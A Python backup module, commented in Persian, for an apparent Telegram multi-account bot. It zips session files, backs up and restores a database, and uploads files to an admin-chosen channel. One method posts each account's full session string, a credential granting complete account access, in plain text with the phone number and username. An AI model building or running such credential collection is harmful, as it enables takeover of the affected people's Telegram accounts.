"""ماژول مدیریت بکاپ"""
import logging
import asyncio
import shutil
import zipfile
from pathlib import Path
from datetime import datetime
from typing import Optional, Dict, List
from telethon import TelegramClient
from telethon.sessions import StringSession

from src.config import Config

logger = logging.getLogger(__name__)

class BackupManager:
    """کلاس مدیریت بکاپ"""
    
    def __init__(self, api_id: Optional[int] = None, api_hash: Optional[str] = None):
        """مقداردهی اولیه"""
        self.api_id = api_id or Config.API_ID
        self.api_hash = api_hash or Config.API_HASH
        self.backup_channel_id = None  # باید توسط ادمین تنظیم بشه
    
    def set_backup_channel(self, channel_id: int):
        """تنظیم کانال بکاپ"""
        self.backup_channel_id = channel_id
        logger.info(f"کانال بکاپ تنظیم شد: {channel_id}")
    
    async def upload_session_to_channel(self, session_path: str, phone: str, 
                                       username: Optional[str] = None) -> Dict[str, any]:
        """
        آپلود فایل سشن به کانال بکاپ با سشن استرینگ کامل
        
        Args:
            session_path: مسیر فایل سشن
            phone: شماره تلفن
            username: یوزرنیم (اختیاری)
            
        Returns:
            دیکشنری حاوی وضعیت
        """
        if not self.backup_channel_id:
            return {
                'success': False,
                'message': 'کانال بکاپ تنظیم نشده است'
            }
        
        client = None
        
        try:
            # استفاده از ربات برای آپلود
            client = TelegramClient(
                'backup_bot',
                self.api_id,
                self.api_hash
            )
            
            await client.start(bot_token=Config.BOT_TOKEN)
            
            # خواندن محتوای سشن استرینگ کامل
            session_content = Path(session_path).read_text(encoding='utf-8')
            
            # ساخت کپشن با سشن استرینگ کامل
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            caption = (
                f"📱 **بکاپ سشن**\n\n"
                f"📞 شماره: `{phone}`\n"
                f"👤 یوزرنیم: @{username or 'ندارد'}\n"
                f"📅 تاریخ: {timestamp}\n"
                f"📁 فایل: {Path(session_path).name}\n\n"
                f"🔐 **Session String (کامل):**\n"
                f"```\n{session_content}\n```"
            )
            
            # آپلود فایل سشن با کپشن کامل
            await client.send_file(
                self.backup_channel_id,
                session_path,
                caption=caption
            )
            
            logger.info(f"سشن {phone} با session string کامل به کانال بکاپ آپلود شد")
            
            return {
                'success': True,
                'message': 'سشن با موفقیت بکاپ شد'
            }
            
        except Exception as e:
            logger.exception(f"خطا در آپلود سشن: {e}")
            return {
                'success': False,
                'message': f'خطا: {str(e)}'
            }
        
        finally:
            if client:
                await client.disconnect()
    
    async def backup_database(self, db_path: str) -> Dict[str, any]:
        """
        بکاپ گرفتن از دیتابیس
        
        Args:
            db_path: مسیر فایل دیتابیس
            
        Returns:
            دیکشنری حاوی مسیر بکاپ
        """
        try:
            # ساخت نام فایل بکاپ
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            backup_filename = f"backup_db_{timestamp}.db"
            backup_path = Path('data') / backup_filename
            
            # کپی کردن دیتابیس
            shutil.copy2(db_path, backup_path)
            
            logger.info(f"بکاپ دیتابیس ساخته شد: {backup_path}")
            
            return {
                'success': True,
                'message': 'بکاپ با موفقیت ساخته شد',
                'backup_path': str(backup_path),
                'backup_filename': backup_filename
            }
            
        except Exception as e:
            logger.exception(f"خطا در بکاپ دیتابیس: {e}")
            return {
                'success': False,
                'message': f'خطا: {str(e)}'
            }
    
    async def create_sessions_zip(self, session_paths: List[str]) -> Dict[str, any]:
        """
        ساخت فایل زیپ از تمام سشن‌ها
        
        Args:
            session_paths: لیست مسیر فایل‌های سشن
            
        Returns:
            دیکشنری حاوی مسیر فایل زیپ
        """
        try:
            # ساخت نام فایل زیپ
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            zip_filename = f"backup_sessions_{timestamp}.zip"
            zip_path = Path('data') / zip_filename
            
            # ساخت فایل زیپ
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for session_path in session_paths:
                    if Path(session_path).exists():
                        # اضافه کردن فایل به زیپ
                        zipf.write(session_path, Path(session_path).name)
            
            logger.info(f"فایل زیپ سشن‌ها ساخته شد: {zip_path}")
            
            return {
                'success': True,
                'message': 'فایل زیپ با موفقیت ساخته شد',
                'zip_path': str(zip_path),
                'zip_filename': zip_filename,
                'total_sessions': len(session_paths)
            }
            
        except Exception as e:
            logger.exception(f"خطا در ساخت فایل زیپ: {e}")
            return {
                'success': False,
                'message': f'خطا: {str(e)}'
            }
    
    async def upload_database_backup(self, backup_path: str) -> Dict[str, any]:
        """
        آپلود بکاپ دیتابیس به کانال
        
        Args:
            backup_path: مسیر فایل بکاپ
            
        Returns:
            دیکشنری حاوی وضعیت
        """
        if not self.backup_channel_id:
            return {
                'success': False,
                'message': 'کانال بکاپ تنظیم نشده است'
            }
        
        client = None
        
        try:
            client = TelegramClient(
                'backup_bot',
                self.api_id,
                self.api_hash
            )
            
            await client.start(bot_token=Config.BOT_TOKEN)
            
            # ساخت کپشن
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            file_size = Path(backup_path).stat().st_size / 1024  # KB
            
            caption = (
                f"💾 **بکاپ دیتابیس**\n\n"
                f"📅 تاریخ: {timestamp}\n"
                f"📦 حجم: {file_size:.2f} KB\n"
                f"📁 فایل: {Path(backup_path).name}"
            )
            
            # آپلود فایل
            await client.send_file(
                self.backup_channel_id,
                backup_path,
                caption=caption
            )
            
            logger.info(f"بکاپ دیتابیس به کانال آپلود شد")
            
            return {
                'success': True,
                'message': 'بکاپ به کانال آپلود شد'
            }
            
        except Exception as e:
            logger.exception(f"خطا در آپلود بکاپ: {e}")
            return {
                'success': False,
                'message': f'خطا: {str(e)}'
            }
        
        finally:
            if client:
                await client.disconnect()
    
    async def restore_database(self, backup_file_path: str, target_db_path: str) -> Dict[str, any]:
        """
        ریستور کردن دیتابیس از بکاپ
        
        Args:
            backup_file_path: مسیر فایل بکاپ
            target_db_path: مسیر دیتابیس اصلی
            
        Returns:
            دیکشنری حاوی وضعیت
        """
        try:
            # بکاپ از دیتابیس فعلی قبل از ریستور
            if Path(target_db_path).exists():
                safety_backup = f"{target_db_path}.before_restore"
                shutil.copy2(target_db_path, safety_backup)
                logger.info(f"بکاپ امنیتی ساخته شد: {safety_backup}")
            
            # ریستور کردن
            shutil.copy2(backup_file_path, target_db_path)
            
            logger.info(f"دیتابیس از {backup_file_path} ریستور شد")
            
            return {
                'success': True,
                'message': 'دیتابیس با موفقیت ریستور شد'
            }
            
        except Exception as e:
            logger.exception(f"خطا در ریستور دیتابیس: {e}")
            return {
                'success': False,
                'message': f'خطا: {str(e)}'
            }
